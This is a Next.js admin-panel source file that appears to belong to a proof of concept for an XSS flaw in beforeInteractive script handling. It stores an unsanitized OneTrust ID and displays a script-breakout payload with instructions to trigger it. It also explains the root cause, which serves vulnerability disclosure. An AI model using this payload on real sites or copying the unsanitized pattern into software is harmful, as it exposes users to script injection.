import { cookies } from 'next/headers'
import { redirect } from 'next/navigation'

async function updateOneTrustId(formData: FormData) {
  'use server'

  const oneTrustId = formData.get('onetrust_id') as string
  const cookieStore = await cookies()

  // Store configuration (in real app, this would be in database)
  cookieStore.set('onetrust_id', oneTrustId, {
    maxAge: 60 * 60 * 24 * 7 // 7 days
  })

  redirect('/')
}

export default async function AdminPanel() {
  const cookieStore = await cookies()
  const currentOneTrustId = cookieStore.get('onetrust_id')?.value || ''

  return (
    <div>
      <div style={{
        background: 'white',
        padding: '30px',
        borderRadius: '8px',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <h2 style={{ marginBottom: '20px' }}>Admin Panel - OneTrust Configuration</h2>

        <form action={updateOneTrustId}>
          <div style={{ marginBottom: '20px' }}>
            <label style={{
              display: 'block',
              marginBottom: '8px',
              fontWeight: '500'
            }}>
              OneTrust Domain Script ID
            </label>
            <input
              type="text"
              name="onetrust_id"
              defaultValue={currentOneTrustId}
              placeholder="e.g., 12345678-1234-1234-1234-123456789abc"
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '6px',
                fontSize: '14px',
                fontFamily: 'monospace'
              }}
              required
            />
            <p style={{
              marginTop: '8px',
              fontSize: '13px',
              color: '#666'
            }}>
              This ID will be passed to the OneTrust script via data-domain-script attribute
            </p>
          </div>

          <button
            type="submit"
            style={{
              background: '#0070f3',
              color: 'white',
              padding: '12px 24px',
              border: 'none',
              borderRadius: '6px',
              fontSize: '14px',
              fontWeight: '500',
              cursor: 'pointer'
            }}
          >
            Save Configuration
          </button>
        </form>
      </div>

      <div style={{
        background: '#f8d7da',
        padding: '20px',
        borderRadius: '8px',
        marginTop: '20px',
        border: '1px solid #f5c6cb'
      }}>
        <h4 style={{ marginBottom: '10px', color: '#721c24' }}>🔴 XSS Test Payload</h4>
        <p style={{ fontSize: '14px', marginBottom: '15px', color: '#721c24' }}>
          To demonstrate the XSS vulnerability, paste this payload into the OneTrust Domain ID field:
        </p>
        <code style={{
          display: 'block',
          padding: '15px',
          background: 'white',
          border: '1px solid #f5c6cb',
          borderRadius: '4px',
          fontSize: '13px',
          fontFamily: 'monospace',
          overflowX: 'auto',
          color: '#721c24'
        }}>
          {"</script><img src=x onerror=alert('XSS-via-beforeInteractive')>"}
        </code>
        <p style={{ marginTop: '15px', fontSize: '13px', color: '#721c24' }}>
          After saving, return to the homepage. The alert will fire because the payload breaks
          out of the JSON.stringify() context in the beforeInteractive script.
        </p>
      </div>

      <div style={{
        background: '#d1ecf1',
        padding: '20px',
        borderRadius: '8px',
        marginTop: '20px',
        border: '1px solid #bee5eb'
      }}>
        <h4 style={{ marginBottom: '10px', color: '#0c5460' }}>📖 Why This Vulnerability Exists</h4>
        <ol style={{ marginLeft: '20px', fontSize: '14px', color: '#0c5460', lineHeight: '1.6' }}>
          <li style={{ marginBottom: '8px' }}>
            <strong>OneTrust requires beforeInteractive:</strong> Cookie consent must load before
            React hydrates (documented in Issue #49830)
          </li>
          <li style={{ marginBottom: '8px' }}>
            <strong>Multi-tenant configuration:</strong> Each tenant/customer configures their
            own OneTrust Domain ID
          </li>
          <li style={{ marginBottom: '8px' }}>
            <strong>No sanitization:</strong> Next.js uses JSON.stringify() without htmlEscapeJsonString
            in script.tsx lines 284, 308, 354
          </li>
          <li>
            <strong>Result:</strong> Tenant admins can inject XSS that affects all users of their
            tenant subdomain
          </li>
        </ol>
      </div>
    </div>
  )
}
